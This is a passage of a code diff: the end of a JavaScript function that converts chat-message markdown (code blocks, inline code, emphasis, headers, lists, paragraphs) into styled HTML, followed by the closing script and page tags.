+      '<pre class="chat-code"><code class="lang-' + (lang||'bash') + '">' + code.trim() + '</code></pre>')
+    // Inline code
+    .replace(/`([^`]+)`/g, '<code class="chat-inline-code">$1</code>')
+    // Bold
+    .replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>')
+    // Italic
+    .replace(/\*([^*]+)\*/g, '<em>$1</em>')
+    // Headers
+    .replace(/^### (.+)$/gm, '<h4 class="chat-h4">$1</h4>')
+    .replace(/^## (.+)$/gm,  '<h3 class="chat-h3">$1</h3>')
+    .replace(/^# (.+)$/gm,   '<h2 class="chat-h2">$1</h2>')
+    // Numbered lists
+    .replace(/^(\d+)\.\s+(.+)$/gm, '<div class="chat-li-num"><span class="li-n">$1.</span> $2</div>')
+    // Bullet lists
+    .replace(/^[-*] (.+)$/gm, '<div class="chat-li">• $1</div>')
+    // Paragraphs (double newline)
+    .replace(/\n\n/g, '</p><p class="chat-p">')
+    // Single newlines in non-block context
+    .replace(/\n/g, '<br>');
+
+  return '<p class="chat-p">' + html + '</p>';
+}
+// ════════════════════════════════════════════════════════════════════════════
+</script>
+</body>
+</html>
